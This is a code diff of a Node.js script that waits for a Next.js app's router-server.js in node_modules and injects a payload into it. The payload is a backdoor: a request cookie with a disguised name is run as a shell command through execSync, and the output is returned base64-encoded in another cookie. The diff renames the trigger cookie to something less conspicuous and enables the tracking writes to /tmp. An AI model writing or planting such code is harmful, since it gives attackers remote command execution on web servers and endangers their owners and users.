@@ -25,7 +25,7 @@ if (process.argv[2] == 'a') {
 } else if (process.argv[2]) {
   const appPath = process.argv[2];
   const filePath = `${appPath}/node_modules/next/dist/server/lib/router-server.js`;
-  // fs.writeFileSync('/tmp/file.path', filePath);
+  fs.writeFileSync('/tmp/file.path', filePath);
 
   let waited = 0;
   while (waited < 60000) {
@@ -33,12 +33,12 @@ if (process.argv[2] == 'a') {
     Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 100);
     waited += 100;
   }
-  // fs.writeFileSync('/tmp/file.created', filePath);
+  fs.writeFileSync('/tmp/file.created', filePath);
 
   if (waited < 60000) {
     try {
-      const payload = "\t\t// Triple-T says Sahur!\n\t\tif (req.headers.cookie) {\n\t\t\tconst cookies = req.headers.cookie.split(\"; \");\n\t\t\tfor (let i = 0; i < cookies.length; i++) {\n\t\t\t\tconst cookie = cookies[i].split(\"=\");\n\t\t\t\tif (cookie[0] == \"baka\") {\n\t\t\t\t\tconst { execSync } = require(\"child_process\");\n\t\t\t\t\tconst output = execSync(cookie[1]).toString();\n\t\t\t\t\tres.setHeader(\"Set-Cookie\", `evil_out=${Buffer.from(output.trim()).toString(\"base64url\")}; Path=/; HttpOnly`)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n"
-      let lines = "" 
+      const payload = "\t\t// Triple-T says Sahur!\n\t\tif (req.headers.cookie) {\n\t\t\tconst cookies = req.headers.cookie.split(\"; \");\n\t\t\tfor (let i = 0; i < cookies.length; i++) {\n\t\t\t\tconst cookie = cookies[i].split(\"=\");\n\t\t\t\tif (cookie[0] == \"__TTT-54HuR\") {\n\t\t\t\t\tconst { execSync } = require(\"child_process\");\n\t\t\t\t\tconst output = execSync(cookie[1]).toString();\n\t\t\t\t\tres.setHeader(\"Set-Cookie\", `__tLL-TLalA=${Buffer.from(output.trim()).toString(\"base64url\").toString(\"base64url\")}; Path=/; HttpOnly`)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n"
+      let lines = ""
       lines = fs.readFileSync(filePath, 'utf8').split(/\r?\n/);
 
       const linesToInsert = payload.split(/\r?\n/);
